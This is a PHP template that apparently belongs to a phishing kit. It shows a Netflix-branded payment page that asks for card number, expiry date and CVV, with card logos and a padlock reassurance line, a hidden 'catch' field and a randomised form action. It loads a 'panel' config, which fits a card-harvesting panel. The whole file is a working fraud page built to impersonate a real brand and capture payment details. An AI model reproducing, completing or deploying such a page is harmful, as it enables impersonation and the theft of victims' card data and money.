<?php
require_once 'config/panel.php';
$title = "Netflix";
ob_start();
?>
<div class="container d-flex flex-column justify-content-start align-items-center my-3">
     <form class="w-100 p-2 d-flex flex-column justify-content-center align-items-center shadow-lg rounded-2" method="post" action="index.php?id=<?= md5(time()) ?>">
     <input type="hidden" name="catch">

     <h1 class="my-4 p-0"><?= lang("xpay1"); ?></h1>

<div class="w-100 form-floating mb-4">
  <input name="ccn" type="tel" class="cc form-control <?php if ($_SESSION['ERRORS']['ccn']) { echo 'is-invalid'; } ?>" placeholder="" value="<?php if (!empty($_SESSION['sccn'])){ echo $_SESSION['sccn'];} ?>" id="floatingInput" placeholder="name@example.com">
  <label for="floatingInput"><?= lang("xpay2"); ?></label>
  <div  class="invalid-feedback"><?= lang("xpay3"); ?></div>
</div>

<div class="w-100 mb-3 d-flex flex-row justify-content-start align-items-start">
<div class="w-100 form-floating mb-4 me-2">
  <input type="tel" name="exp" maxlength="5" class="exp form-control <?php if ($_SESSION['ERRORS']['exp']) { echo 'is-invalid'; } ?>" placeholder="" value="<?php if (!empty($_SESSION['sexp'])){ echo $_SESSION['sexp'];} ?>" id="floatingInput" placeholder="name@example.com">
  <label for="floatingInput"><?= lang("xpay4"); ?></label>
  <div  class="invalid-feedback"><?= lang("xpay5"); ?></div>
</div>
<div class="w-100 form-floating mb-4">
  <input name="cvv" type="tel" maxlength="4" class="form-control <?php if ($_SESSION['ERRORS']['cvv']) { echo 'is-invalid'; } ?>" placeholder="" value="<?php if (!empty($_SESSION['scvv'])){ echo $_SESSION['scvv'];} ?>" id="floatingInput" placeholder="name@example.com">
  <label for="floatingInput"><?= lang("xpay6"); ?></label>
  <div  class="invalid-feedback"><?= lang("xpay7"); ?></div>
</div>
</div>
<div class="w-100 d-flex justify-content-end">
			<svg class="m-1" width="24" height="16" viewBox="0 0 24 16">
				<g fill-rule="nonzero" fill="none"><rect stroke-opacity=".2" stroke="#000" stroke-width=".5" fill="#FFF" x=".25" y=".25" width="23.5" height="15.5" rx="2"></rect><path d="M2.79 5.91A7.2 7.2 0 0 0 1 5.24l.03-.13h2.73c.38.01.68.13.77.52l.6 2.84.18.85 1.67-4.2h1.8L6.1 11.27H4.3L2.8 5.9zm7.31 5.37H8.4l1.06-6.17h1.7l-1.06 6.17zm6.17-6.02l-.23 1.34-.16-.07c-.3-.12-.71-.25-1.27-.24-.67 0-.97.27-.98.54 0 .28.37.47.96.76.98.44 1.44.98 1.43 1.68-.01 1.28-1.17 2.1-2.96 2.1-.76 0-1.5-.15-1.9-.32l.24-1.39.23.1c.55.23.91.33 1.6.33.48 0 1-.2 1.01-.6 0-.27-.22-.47-.88-.77-.64-.3-1.5-.8-1.49-1.68 0-1.2 1.2-2.04 2.87-2.04.66 0 1.2.14 1.53.26zm2.26 3.84h1.41l-.39-1.79-.12-.53-.22.6-.68 1.72zm2.1-3.99L22 11.28h-1.58l-.2-.92h-2.18l-.36.92H15.9l2.52-5.66c.18-.4.49-.5.9-.5h1.3z" fill="#1434cb"></path></g>	  
			</svg>
			<svg class="m-1" width="24" height="16" viewBox="0 0 24 16">
				<g fill="none" fill-rule="evenodd"><rect fill="#252525" height="16" rx="2" width="24"></rect><circle cx="9" cy="8" fill="#eb001b" r="5"></circle><circle cx="15" cy="8" fill="#f79e1b" r="5"></circle><path d="M12 4a5 5 0 0 1 0 8 5 5 0 0 1 0-8z" fill="#ff5f00"></path></g>
			</svg>
			<svg class="m-1" width="24" height="16" viewBox="0 0 24 16">
				<g fill="none" fill-rule="evenodd"><rect fill="#016fd0" height="16" rx="2" width="24"></rect><path d="M13.76 13.4V7.7h10.15v1.58l-1.17 1.25 1.17 1.26v1.61h-1.87l-1-1.1-.98 1.1z" fill="#fffffe"></path><path d="M14.44 12.77V8.32h3.77v1.02h-2.55v.7h2.5v1h-2.5v.7h2.55v1.03z" fill="#016fd0"></path><path d="M18.2 12.77l2.08-2.23-2.08-2.22h1.61l1.28 1.41 1.28-1.41h1.54v.04l-2.04 2.18 2.04 2.17v.06h-1.56l-1.3-1.43-1.28 1.43z" fill="#016fd0"></path><path d="M14.24 2.63h2.44l.86 1.95V2.63h3.02l.52 1.46.53-1.46h2.3v5.7H11.73z" fill="#fffffe"></path><g fill="#016fd0"><path d="M14.7 3.25L12.73 7.7h1.35l.37-.9h2.02l.37.9h1.39l-1.97-4.45zm.17 2.56l.6-1.42.58 1.42z"></path><path d="M18.21 7.7V3.25h1.9L21.1 6l.99-2.74h1.83V7.7h-1.18V4.66L21.62 7.7h-1.08l-1.13-3.06V7.7z"></path></g></g> 
			</svg>  
			<svg class="m-1" width="24" height="16" viewBox="0 0 24 16">
				<g fill-rule="nonzero" fill="none"><path d="M22 15.75c.95 0 1.74-.77 1.75-1.75V2c0-.46-.2-.91-.52-1.24A1.72 1.72 0 0 0 22 .25H2c-.46 0-.9.18-1.23.5C.44 1.1.25 1.55.25 2v12c0 .46.2.91.52 1.24.33.33.77.51 1.23.51h20zm0 .5z" stroke-opacity=".2" stroke="#000" stroke-width=".5" fill="#FFF"></path><path d="M12.61 16H22a1.99 1.99 0 0 0 2-1.97v-2.36A38.74 38.74 0 0 1 12.61 16z" fill="#F27712"></path><path d="M23.17 9.3h-.85l-.96-1.27h-.1V9.3h-.69V6.15h1.03c.8 0 1.27.33 1.27.93 0 .49-.3.8-.81.9l1.11 1.32zm-1.02-2.2c0-.3-.24-.46-.67-.46h-.21v.95h.2c.44 0 .68-.16.68-.49zm-4-.95h1.96v.53h-1.27v.7h1.22v.54h-1.22v.86h1.27v.52h-1.97V6.15zM15.9 9.38L14.4 6.14h.76l.95 2.12.96-2.12h.75L16.3 9.38h-.39zm-6.3 0c-1.06 0-1.89-.73-1.89-1.66 0-.91.85-1.65 1.9-1.65.3 0 .55.06.86.19v.73a1.24 1.24 0 0 0-.87-.36c-.66 0-1.17.48-1.17 1.09 0 .63.5 1.09 1.2 1.09.32 0 .56-.1.84-.35v.73c-.32.13-.58.18-.87.18zM7.5 8.33c0 .6-.5 1.03-1.24 1.03-.53 0-.9-.18-1.23-.6l.46-.38c.15.28.42.42.75.42.31 0 .54-.2.54-.44 0-.14-.07-.25-.21-.33a2.88 2.88 0 0 0-.48-.18c-.65-.21-.88-.43-.88-.87 0-.52.48-.9 1.11-.9.4 0 .75.12 1.05.35l-.36.42a.76.76 0 0 0-.56-.25c-.3 0-.52.15-.52.34 0 .17.13.26.54.4.8.25 1.03.48 1.03 1v-.01zM4.09 6.15h.7V9.3h-.7V6.15zM1.85 9.3H.83V6.15h1.02c1.13 0 1.9.65 1.9 1.57 0 .48-.22.92-.63 1.22-.35.25-.74.36-1.27.36zm.81-2.36c-.23-.18-.5-.25-.95-.25h-.19v2.09h.2c.44 0 .72-.09.94-.25a1 1 0 0 0 0-1.59z" fill="#000"></path><path d="M12.41 6.07c-.9 0-1.65.73-1.65 1.63 0 .96.71 1.68 1.65 1.68.93 0 1.66-.73 1.66-1.66 0-.92-.72-1.65-1.66-1.65z" fill="#F27712"></path></g>
			</svg>
		</div>
   
  <div class="w-100 d-flex flex-row mb-1 mt-3">
<svg class="me-1" style="width: 12px;padding-bottom:6px;" viewBox="0 0 12 16"><g fill="none"><g fill="#FFB53F"><path d="M8.4 5L8.4 6.3 10 6.3 10 5C10 2.8 8.2 1 6 1 3.8 1 2 2.8 2 5L2 6.3 3.6 6.3 3.6 5C3.6 3.7 4.7 2.6 6 2.6 7.3 2.6 8.4 3.7 8.4 5ZM11 7L11 15 1 15 1 7 11 7ZM6.5 11.3C7 11.1 7.3 10.6 7.3 10.1 7.3 9.3 6.7 8.7 6 8.7 5.3 8.7 4.7 9.3 4.7 10.1 4.7 10.6 5 11.1 5.5 11.3L5.2 13.4 6.9 13.4 6.5 11.3Z"></path></g></g></svg>
<span class="light-font" style="color: #b3b3b3;font-size: 13px;"><?= lang("xpay8"); ?></span>
</div>
    <button class="btn btn-danger w-100 m-0 p-0" type="submit" name="submit" value="page4"><?= lang("xpay9"); ?></button>
  </form>
</div>
<script src="assets/js/cleave.js"></script>
    <script src="assets/js/main.js"></script>
    <script src="assets/js/expmain.js"></script>
<?php $content = ob_get_clean(); ?>
<?php require_once 'views/layout_dash.php' ?>